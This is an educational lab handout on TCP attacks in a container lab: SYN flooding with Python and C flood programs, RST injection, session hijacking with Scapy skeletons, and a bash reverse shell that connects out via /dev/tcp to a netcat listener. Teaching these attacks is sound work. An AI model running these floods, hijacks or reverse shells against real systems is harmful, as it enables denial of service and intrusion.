## 1 Overview

The learning objective of this lab is for students to gain first-hand experience on vulnerabilities, as well
as on attacks against these vulnerabilities. Wise people learn from mistakes. In security education, we
study mistakes that lead to software vulnerabilities. Studying mistakes from the past not only help students
understand why systems are vulnerable, why a seemly-benign mistake can turn into a disaster, and why
many security mechanisms are needed. More importantly, it also helps students learn the common patterns
of vulnerabilities, so they can avoid making similar mistakes in the future. Moreover, using vulnerabilities
as case studies, students can learn the principles of secure design, secure programming, and security testing.
The vulnerabilities in the TCP/IP protocols represent a special genre of vulnerabilities in protocol de-
signs and implementations; they provide an invaluable lesson as to why security should be designed in from
the beginning, rather than being added as an afterthought. Moreover, studying these vulnerabilities help stu-
dents understand the challenges of network security and why many network security measures are needed.
In this lab, students will conduct several attacks on TCP. This lab covers the following topics:

- The TCP protocol
- TCP SYN flood attack, and SYN cookies
- TCP reset attack
- TCP session hijacking attack
- Reverse shell
- A special type of TCP attack, the Mitnick attack, is covered in a separate lab.

Readings and videos. Detailed coverage of the TCP attacks can be found in the following:

    at https://www.handsonsecurity.net/video.html.

Lab environment. This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.

## 2 Lab Environment

Files needed for this lab are included in Labsetup.zip, which can be fetched by running the following commands.

```
$ sudo wget https://seedsecuritylabs.org/Labs_20.04/Files/TCP_Attacks/Labsetup.zip
$ sudo unzip Labsetup.zip
```

In this lab, we need to have at least three machines. We use containers to set up the lab environment. Figure 1
depicts the lab setup. We will use the attacker container to launch attacks, while using the other three
containers as the victim and user machines. We assume all these machines are on the same LAN. Students
can also use three virtual machines for this lab, but it will be much more convenient to use containers.

### 2.1 Container Setup and Commands

Please download the Labsetup.zip file to your VM from the lab’s website, unzip it, enter theLabsetup
folder, and use the docker-compose.yml file to set up the lab environment. Detailed explanation of the
content in this file and all the involved Dockerfile can be found from the user manual, which is linked
to the website of this lab. If this is the first time you set up a SEED lab environment using containers, it is
very important that you read the user manual.
In the following, we list some of the commonly used commands related to Docker and Compose. Since
we are going to use these commands very frequently, we have created aliases for them in the .bashrc file
(in our provided SEEDUbuntu 20.04 VM).

```
$ docker-compose build # Build the container image
$ docker-compose up # Start the container
$ docker-compose down # Shut down the container

// Aliases for the Compose commands above
$ dcbuild # Alias for: docker-compose build
$ dcup # Alias for: docker-compose up
$ dcdown # Alias for: docker-compose down
```

All the containers will be running in the background. To run commands on a container, we often need
to get a shell on that container. We first need to use the "docker ps" command to find out the ID of
the container, and then use "docker exec" to start a shell on that container. We have created aliases for
them in the .bashrc file.

```
$ dockps // Alias for: docker ps --format "{{.ID}} {{.Names}}"
$ docksh <id> // Alias for: docker exec -it <id> /bin/bash

// The following example shows how to get a shell inside hostC
$ dockps
b1004832e275 hostA-10.9.0.
0af4ea7a3e2e hostB-10.9.0.
9652715c8e0a hostC-10.9.0.

$ docksh 96
root@9652715c8e0a:/#


// Note: If a docker command requires a container ID, you do not need to
// type the entire ID string. Typing the first few characters will
// be sufficient, as long as they are unique among all the containers.
```

If you encounter problems when setting up the lab environment, please read the “Common Problems”
section of the manual for potential solutions.

### 2.2 About the Attacker Container

In this lab, we can either use the VM or the attacker container as the attacker machine. If you look at
the Docker Compose file, you will see that the attacker container is configured differently from the other
containers.

- Shared folder. When we use the attacker container to launch attacks, we need to put the attacking
    code inside the attacker container. Code editing is more convenient inside the VM than in containers,
    because we can use our favorite editors. In order for the VM and container to share files, we have
    created a shared folder between the VM and the container using the Dockervolumes. If you look
    at the Docker Compose file, you will find out that we have added the following entry to some of the
    containers. It indicates mounting the./volumesfolder on the host machine (i.e., the VM) to the
    /volumesfolder inside the container. We will write our code in the./volumesfolder (on the
    VM), so they can be used inside the containers.
  ```
  volumes:
       - ./volumes:/volumes
  ```
- Host mode. In this lab, the attacker needs to be able to sniff packets, but running sniffer programs
    inside a container has problems, because a container is effectively attached to a virtual switch, so it
    can only see its own traffic, and it is never going to see the packets among other containers. To solve
    this problem, we use thehostmode for the attacker container. This allows the attacker container to
    see all the traffics. The following entry used on the attacker container:
    ```
    network_mode: host
    ```
    
    When a container is in thehostmode, it sees all the host’s network interfaces, and it even has the
    same IP addresses as the host. Basically, it is put in the same network namespace as the host VM.
    However, the container is still a separate machine, because its other namespaces are still different
    from the host.

### 2.3 The seed Account

In this lab, we need to telnet from one containter to another. We have already created an account called
seedinside all the containers. Its password isdees. You can telnet into this account.

## 3 Task 1: SYN Flooding Attack

SYN flood is a form of DoS attack in which attackers send many SYN requests to a victim’s TCP port, but
the attackers have no intention to finish the 3-way handshake procedure. Attackers either use spoofed IP
address or do not continue the procedure. Through this attack, attackers can flood the victim’s queue that

![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/bff58889-41a7-4b76-b356-d02a4dfeeb18)
`Figure 2: SYN Flooding Attack`

is used for half-opened connections, i.e. the connections that has finished SYN, SYN-ACK, but has not yet
gotten a final ACK back. When this queue is full, the victim cannot take any more connection. Figure 2
illustrates the attack.
The size of the queue has a system-wide setting. In Ubuntu OSes, we can check the setting using the
following command. The OS sets this value based on the amount of the memory the system has: the more
memory the machine has, the larger this value will be.

```
# sysctl net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
```

We can use command"netstat -nat"to check the usage of the queue, i.e., the number of half-
opened connection associated with a listening port. The state for such connections isSYN-RECV. If the
3-way handshake is finished, the state of the connections will be ESTABLISHED.

SYN Cookie Countermeasure: By default, Ubuntu’s SYN flooding countermeasure is turned on. This
mechanism is called SYN cookie. It will kick in if the machine detects that it is under the SYN flood-
ing attack. In our victim server container, we have already turned it off (see thesysctlsentry in the
docker-compose.ymlfile). We can use the followingsysctlcommand to turn it on and off:

```
# sysctl -a | grep syncookies (Display the SYN cookie flag)
# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
# sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)
```

To be able to use sysctl to change the system variables inside a container, the container needs to be
configured with the"privileged: true"entry (which is the case for our victim server). Without
this setting, if we run the above command, we will see the following error message. The container is not
given the privilege to make the change.

```
# sysctl -w net.ipv4.tcp_syncookies=1
sysctl: setting key "net.ipv4.tcp_syncookies": Read-only file system
```

### 3.1 Task 1.1: Launching the Attack Using Python

We provide a Python program calledsynflood.py, but we have intentionally left out some essential data
in the code. This code sends out spoofed TCP SYN packets, with randomly generated source IP address,
source port, and sequence number. Students should finish the code and then use it to launch the attack on
the target machine:

```
#!/bin/env python

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="*.*.*.*")
tcp = TCP(dport=**, flags=’S’)
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
    pkt[TCP].sport = getrandbits(16) # source port
    pkt[TCP].seq = getrandbits(32) # sequence number
    send(pkt, verbose = 0)
```

Let the attack run for at least one minute, then try to telnet into the victim machine, and see whether you
can succeed. Very likely that your attack will fail. Multiple issues can contribute to the failure of the attack.
They are listed in the following with guidelines on how to address them.

- TCP cache issue:See Note A below.
- VirtualBox issue:If you are doing the attack from one VM against another VM, instead of using our
    container setup, please see Note B below. This is not an issue if you are doing the attack using the
    container setup.
- TCP retransmission issue:After sending out the SYN+ACK packet, the victim machine will wait
    for the ACK packet. If it does not come in time, TCP will retransmit the SYN+ACK packet. How
    many times it will retransmit depends on the following kernel parameters (by default, its value is 5):
    ```
    # sysctl net.ipv4.tcp_synack_retries
    net.ipv4.tcp_synack_retries = 5
    ```
    
After these 5 retransmissions, TCP will remove the corresponding item from the half-open connection
queue. Every time when an item is removed, a slot becomes open. Your attack packets and the
legitimate telnet connection request packets will fight for this opening. Our Python program may not
be fast enough, and can thus lose to the legitimate telnet packet. To win the competition, we can
run multiple instances of the attack program in parallel. Please try this approach and see whether the
success rate can be improved. How many instances should you run to achieve a reasonable success
rate?

- The size of the queue:How many half-open connections can be stored in the queue can affect the
    success rate of the attack. The size of the queue be adjusted using the following command:
    ```
    # sysctl -w net.ipv4.tcp_max_syn_backlog=80
    ```
    
While the attack is ongoing, you can run one of the following commands on the victim container to
see how many items are in the queue. It should be noted that one fourth of the space in the queue is
reserved for “proven destinations” (see Note A below), so if we set the size to 80, its actual capacity
is about 60.
```
$ netstat -tna | grep SYN_RECV | wc -l
$ ss -n state syn-recv sport = :23 | wc -l
```

Please reduce the size of the half-open connection queue on the victim server, and see whether your
success rate can improve.


Note A: A kernel mitigation mechanism. On Ubuntu 20.04, if machine X has never made a TCP con-
nection to the victim machine, when the SYN flooding attack is launched, machine X will not be able to
telnet into the victim machine. However, if before the attack, machine X has already made a telnet (or TCP
connection) to the victim machine, then X seems to be “immune” to the SYN flooding attack, and can suc-
cessfully telnet to the victim machine during the attack. It seems that the victim machine remembers past
successful connections, and uses this memory when establishing future connections with the “returning”
client. This behavior does not exist in Ubuntu 16.04 and earlier versions.
This is due to a mitigation of the kernel: TCP reserves one fourth of the backlog queue for “proven
destinations” if SYN Cookies are disabled. After making a TCP connection from10.9.0.6to the server
10.9.0.5, we can see that the IP address10.9.0.6is remembered (cached) by the server, so they
will be using the reserved slots when connections come from them, and will thus not be affected by the
SYN flooding attack. To remove the effect of this mitigation method, we can run the"ip tcpmetrics
flush"command on the server.

```
# ip tcp_metrics show
10.9.0.6 age 140.552sec cwnd 10 rtt 79us rttvar 40us source 10.9.0.

# ip tcp_metrics flush
```

Note B: RST packets. If you are doing this task using two VMs, i.e., launching the attack from one VM
against another VM, instead of attacking a container, from the Wireshark, you will notice many RST packets
(reset). Initially, we thought that the packets were generated from the recipient of the SYN+ACK packet,
but it turns out they are generated by the NAT server in our setup.
Any traffic going out of the VM in our lab setup will go through the NAT server provided by VirtualBox.
For TCP, NAT creates address translation entries based on the SYN packet. In our attack, the SYN packets
generated by the attacker did not go through the NAT (both attacker and victims are behind the NAT), so no
NAT entry was created. When the victim sends SYN+ACK packet back to the source IP (which is randomly
generated by the attacker), this packet will go out through the NAT, but because there is no prior NAT entry
for this TCP connection, NAT does not know what to do, so it sends a TCP RST packet back to the victim.
RST packets cause the victim to remove the data from the half-open connection queue. Therefore, while
we are trying fill up this queue with the attack, VirtualBox helps the victim to remove our records from the
queue. It becomes a competition between our code and the VirtualBox.

### 3.2 Task 1.2: Launch the Attack Using C

Other than the TCP cache issue, all the issues mentioned in Task 1.1 can be resolved if we can send spoofed
SYN packets fast enough. We can achieve that using C. We provide a C program called synflood.cin


the lab setup. Please compile the program on the VM and then launch the attack on the target machine.

```
// Compile the code on the host VM
$ gcc -o synflood synflood.c

// Launch the attack from the attacker container
# synflood 10.9.0.5 23
```

Before launching the attack, please restore the queue size to its original value. Please compare the results
with the one using the Python program, and explain the reason behind the difference.

### 3.3 Task 1.3: Enable the SYN Cookie Countermeasure

Please enable the SYN cookie mechanism, and run your attacks again, and compare the results.

## 4 Task 2: TCP RST Attacks on telnet Connections

The TCP RST Attack can terminate an established TCP connection between two victims. For example, if
there is an establishedtelnetconnection (TCP) between two users A and B, attackers can spoof a RST
packet from A to B, breaking this existing connection. To succeed in this attack, attackers need to correctly
construct the TCP RST packet.
In this task, you need to launch a TCP RST attack from the VM to break an existingtelnetconnection
between A and B, which are containers. To simplify the lab, we assume that the attacker and the victim are
on the same LAN, i.e., the attacker can observe the TCP traffic between A and B.

Launching the attack manually. Please use Scapy to conduct the TCP RST attack. A skeleton code is
provided in the following. You need to replace each@@@@with an actual value (you can get them using
Wireshark):

```
#!/usr/bin/env python
from scapy.all import *

ip = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="R", seq=@@@@)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```

Optional: Launching the attack automatically. Students are encouraged to write a program to launch
the attack automatically using the sniffing-and-spoofing technique. Unlike the manual approach, we get all
the parameters from sniffed packets, so the entire attack is automated. Please make sure that when you use
Scapy’ssnifffunction, don’t forget to set theifaceargument.

## 5 Task 3: TCP Session Hijacking

The objective of the TCP Session Hijacking attack is to hijack an existing TCP connection (session) between
two victims by injecting malicious contents into this session. If this connection is atelnetsession,
attackers can inject malicious commands (e.g. deleting an important file) into this session, causing the

![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/40635b63-efdb-4c88-b8c8-c64af05070cd)

`Figure 3: TCP Session Hijacking Attack`

victims to execute the malicious commands. Figure 3 depicts how the attack works. In this task, you need to
demonstrate how you can hijack atelnetsession between two computers. Your goal is to get thetelnet
server to run a malicious command from you. For the simplicity of the task, we assume that the attacker and
the victim are on the same LAN.

Launching the attack manually. Please use Scapy to conduct the TCP Session Hijacking attack. A
skeleton code is provided in the following. You need to replace each@@@@with an actual value; you can
use Wireshark to figure out what value you should put into each field of the spoofed TCP packets.

```
#!/usr/bin/env python
from scapy.all import *

ip = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="A", seq=@@@@, ack=@@@@)
data = "@@@@"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
```

Optional: Launching the attack automatically. Students are encouraged to write a program to launch
the attack automatically using the sniffing-and-spoofing technique. Unlike the manual approach, we get all
the parameters from sniffed packets, so the entire attack is automated. Please make sure that when you use
Scapy’ssnifffunction, don’t forget to set theifaceargument.

## 6 Task 4: Creating Reverse Shell using TCP Session Hijacking

When attackers are able to inject a command to the victim’s machine using TCP session hijacking, they
are not interested in running one simple command on the victim machine; they are interested in running
many commands. Obviously, running these commands all through TCP session hijacking is inconvenient.
What attackers want to achieve is to use the attack to set up a back door, so they can use this back door to
conveniently conduct further damages.
A typical way to set up back doors is to run a reverse shell from the victim machine to give the attack the
shell access to the victim machine. Reverse shell is a shell process running on a remote machine, connecting
back to the attacker’s machine. This gives an attacker a convenient way to access a remote machine once it
has been compromised.


In the following, we will show how we can set up a reverse shell if we can directly run a command on
the victim machine (i.e. the server machine). In the TCP session hijacking attack, attackers cannot directly
run a command on the victim machine, so their jobs is to run a reverse-shell command through the session
hijacking attack. In this task, students need to demonstrate that they can achieve this goal.
To have abashshell on a remote machine connect back to the attacker’s machine, the attacker needs a
process waiting for some connection on a given port. In this example, we will usenetcat. This program
allows us to specify a port number and can listen for a connection on that port. In the following demo, we
show two windows, each one is from a different machine. The top window is the attack machine10.9.0.1,
which runsnetcat(ncfor short), listening on port 9090. The bottom window is the victim machine
10.9.0.5, and we type the reverse shell command. As soon as the reverse shell gets executed, the top
window indicates that we get a shell. This is a reverse shell, i.e., it runs on10.9.0.5.

```
+---------------------------------------------------+
| On 10.9.0.1 (attcker) |
| |
| $ nc -lnv 9090 |
| Listening on 0.0.0.0 9090 |
| Connection received on 10.9.0.5 49382 |
| $ <--+ This shell runs on 10.9.0.5 |
| |
+---------------------------------------------------+

+---------------------------------------------------+
| **On 10.9.0.5 (victim)** |
| |
|$ /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 |
| |
+---------------------------------------------------+
```

We provide a brief description on the reverse shell command in the following. Detailed explanation can
be found in the SEED book.

- "/bin/bash -i":istands for interactive, meaning that the shell must be interactive (must provide
    a shell prompt)
- "> /dev/tcp/10.9.0.1/9090": This causes the output (stdout) of the shell to be redirected
    to the tcp connection to 10.9.0.1’s port 9090. The outputstdoutis represented by file descriptor
    number 1.
- "0<&1": File descriptor 0 represents the standard input (stdin). This causes thestdinfor the
    shell to be obtained from the tcp connection.
- "2>&1": File descriptor 2 represents standard errorstderr. This causes the error output to be
    redirected to the tcp connection.

In summary,`"/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1"`starts a `bash` shell,
with its input coming from a tcp connection, and its standard and error outputs being redirected to the same
tcp connection.
In the demo shown above, when thebashshell command is executed on10.9.0.5, it connects back
to thenetcatprocess started on10.9.0.1. This is confirmed via the"Connection received on
10.9.0.5"message displayed bynetcat.


The description above shows how you can set up a reverse shell if you have the access to the target
machine, which is thetelnetserver in our setup, but in this task, you do not have such an access. Your
task is to launch an TCP session hijacking attack on an existingtelnetsession between a user and the
target server. You need to inject your malicious command into the hijacked session, so you can get a reverse
shell on the target server.
